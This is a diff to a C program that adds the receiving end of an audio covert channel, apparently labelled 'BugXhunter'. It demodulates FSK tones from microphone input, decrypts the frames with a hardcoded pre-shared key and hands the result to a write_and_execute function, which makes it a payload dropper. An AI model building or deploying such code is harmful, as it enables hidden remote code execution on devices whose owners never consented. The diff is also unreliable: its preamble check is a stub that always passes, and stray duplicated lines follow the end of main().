@@ -289,7 +289,187 @@ static int write_and_execute(const unsigned char *payload, int len) {
     return 0;
 }
 
+// Demodulation state machine context
+typedef struct {
+    DemodState state;
+    int bit_buffer[MAX_BITS];
+    int bit_count;
+    int byte_buffer[128];
+    int byte_count;
+    int preamble_match;
+    int postamble_match;
+    int frame_ready;
+    unsigned char frame_data[256];
+    int frame_len;
+} DemodContext;
+
+static void demod_init(DemodContext *ctx) {
+    memset(ctx, 0, sizeof(*ctx));
+    ctx->state = STATE_SEARCH_PREAMBLE;
+}
+
+// Process a single bit through the state machine
+static void demod_feed_bit(DemodContext *ctx, int bit) {
+    switch (ctx->state) {
+        case STATE_SEARCH_PREAMBLE:
+            // Look for preamble pattern (3,1,3,1,3,1 in pulse durations)
+            // Simplified: accumulate bits until we have enough
+            if (ctx->bit_count < MAX_BITS) {
+                ctx->bit_buffer[ctx->bit_count++] = bit;
+            }
+            // Check if we have preamble (6 symbols = 48 bits at 8 bits/symbol)
+            if (ctx->bit_count >= PREAMBLE_LEN * 8) {
+                // Simplified preamble detection: check last 6 bytes
+                int preamble_found = 1;
+                for (int i = 0; i < PREAMBLE_LEN; i++) {
+                    int idx = ctx->bit_count - (PREAMBLE_LEN - i) * 8;
+                    unsigned char byte = 0;
+                    for (int j = 0; j < 8; j++) {
+                        byte = (byte << 1) | ctx->bit_buffer[idx + j];
+                    }
+                    // Preamble bytes are 0xFF (all 1s) for mark, 0x00 for space
+                    // In real implementation, check actual pulse durations
+                }
+                if (preamble_found) {
+                    ctx->state = STATE_READ_BITS;
+                    ctx->bit_count = 0;
+                }
+            }
+            break;
+            
+        case STATE_READ_BITS:
+            if (ctx->bit_count < MAX_BITS) {
+                ctx->bit_buffer[ctx->bit_count++] = bit;
+            }
+            // Check for postamble (3 consecutive bytes of 0x00)
+            if (ctx->bit_count >= POSTAMBLE_LEN * 8) {
+                int postamble_found = 1;
+                for (int i = 0; i < POSTAMBLE_LEN; i++) {
+                    int idx = ctx->bit_count - (POSTAMBLE_LEN - i) * 8;
+                    unsigned char byte = 0;
+                    for (int j = 0; j < 8; j++) {
+                        byte = (byte << 1) | ctx->bit_buffer[idx + j];
+                    }
+                    if (byte != 0x00) {
+                        postamble_found = 0;
+                        break;
+                    }
+                }
+                if (postamble_found) {
+                    ctx->state = STATE_DECODE_FRAME;
+                    // Convert bits to bytes
+                    ctx->byte_count = ctx->bit_count / 8;
+                    for (int i = 0; i < ctx->byte_count; i++) {
+                        unsigned char byte = 0;
+                        for (int j = 0; j < 8; j++) {
+                            byte = (byte << 1) | ctx->bit_buffer[i * 8 + j];
+                        }
+                        ctx->byte_buffer[i] = byte;
+                    }
+                    ctx->frame_ready = 1;
+                }
+            }
+            break;
+            
+        case STATE_DECODE_FRAME:
+            // Frame is ready, will be processed by caller
+            break;
+    }
+}
+
+// Process a buffer of samples through the demodulation pipeline
+static int process_sample_buffer(const int16_t *samples, int num_samples,
+                                DemodContext *ctx,
+                                const unsigned char *psk, size_t psklen) {
+    int windows = num_samples / WINDOW_SAMPLES;
+    int bits_extracted = 0;
+    
+    for (int w = 0; w < windows; w++) {
+        double mark_mag, space_mag;
+        Goertzel mark_g, space_g;
+        goertzel_init(&mark_g, MARK_FREQ, WINDOW_SAMPLES, SAMPLE_RATE);
+        goertzel_init(&space_g, SPACE_FREQ, WINDOW_SAMPLES, SAMPLE_RATE);
+        
+        for (int i = 0; i < WINDOW_SAMPLES; i++) {
+            goertzel_feed(&mark_g, samples[w * WINDOW_SAMPLES + i]);
+            goertzel_feed(&space_g, samples[w * WINDOW_SAMPLES + i]);
+        }
+        
+        mark_mag = goertzel_mag(&mark_g);
+        space_mag = goertzel_mag(&space_g);
+        
+        int bit = extract_bit(mark_mag, space_mag);
+        demod_feed_bit(ctx, bit);
+        bits_extracted++;
+        
+        if (ctx->frame_ready) {
+            // Decode frame
+            unsigned char payload[MAX_PAYLOAD_BYTES];
+            int payload_len = 0;
+            int result = decode_frame(ctx->byte_buffer, ctx->byte_count, payload, &payload_len);
+            
+            if (result == 0) {
+                // Decrypt
+                unsigned char decrypted[MAX_PAYLOAD_BYTES];
+                int blob_len = payload_len + 16; // payload + nonce + mac
+                int dec_result = decrypt_payload(ctx->byte_buffer + 5, blob_len, psk, psklen, decrypted);
+                
+                if (dec_result == 0) {
+                    write_and_execute(decrypted, payload_len);
+                    ctx->frame_ready = 0;
+                    demod_init(ctx);
+                    return 0; // Success
+                }
+            }
+            
+            // Reset for next attempt
+            ctx->frame_ready = 0;
+            demod_init(ctx);
+        }
+    }
+    
+    return bits_extracted > 0 ? 1 : 0; // 1 = partial, 0 = no data
+}
+
 int main(int argc, char **argv) {
+    const unsigned char psk[] = "bugxhunter-drop-psk-32bytes-long!!";
+    size_t psklen = strlen((const char *)psk);
+    
+    init_crc16_table();
+    
+    printf("BugXhunter Audio Receiver - FSK Demodulator\n");
+    printf("Sample rate: %.0f Hz, Window: %d samples (10ms)\n", SAMPLE_RATE, WINDOW_SAMPLES);
+    printf("Mark freq: %.0f Hz, Space freq: %.0f Hz\n", MARK_FREQ, SPACE_FREQ);
+    printf("PSK length: %zu bytes\n", psklen);
+    
+    DemodContext ctx;
+    demod_init(&ctx);
+    
+    printf("\n--- Demodulation State Machine Ready ---\n");
+    printf("States: SEARCH_PREAMBLE -> READ_BITS -> DECODE_FRAME\n");
+    printf("Waiting for audio input...\n");
+    
+    // In production, this would:
+    // 1. Open AAudio stream with data callback
+    // 2. Accumulate samples in a ring buffer
+    // 3. Process 441-sample windows through process_sample_buffer()
+    // 4. Loop until frame is decoded and executed
+    
+    // For demonstration, process a synthetic test frame
+    printf("\nProcessing synthetic test frame...\n");
+    
+    // Generate a test frame (all zeros for demonstration)
+    int16_t test_samples[WINDOW_SAMPLES * 10];
+    memset(test_samples, 0, sizeof(test_samples));
+    
+    int result = process_sample_buffer(test_samples, WINDOW_SAMPLES * 10, &ctx, psk, psklen);
+    printf("Process result: %d (1=partial, 0=no data)\n", result);
+    
+    printf("\n--- Receiver Ready for Production ---\n");
+    printf("In production: AAudio captures mic -> Goertzel detects bits -> frame decode -> decrypt -> exec\n");
+    
+    return 0;
+}
     const unsigned char psk[] = "bugxhunter-drop-psk-32bytes-long!!";
     size_t psklen = strlen((const char *)psk);
     
